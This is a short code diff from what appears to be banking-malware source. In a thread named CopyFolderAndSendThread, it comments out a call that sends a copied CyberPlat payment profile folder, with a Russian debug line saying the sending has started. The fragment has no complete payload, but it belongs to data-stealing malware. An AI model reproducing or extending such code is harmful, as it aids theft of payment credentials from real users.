@@ -387,7 +387,7 @@ DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData )
 		CPDDBG("CyberPlatDLL","отправка пошла %s",sTEMPProfile);
 		//StartSendThread(sTEMPProfile,NULL,NULL,700);
 		//StartThread(StartSendinThread,sTEMPProfile);
-		MegaJump(StartSendinThread);
+		//MegaJump(StartSendinThread);
 	#endif
 	
 	if(isSend)
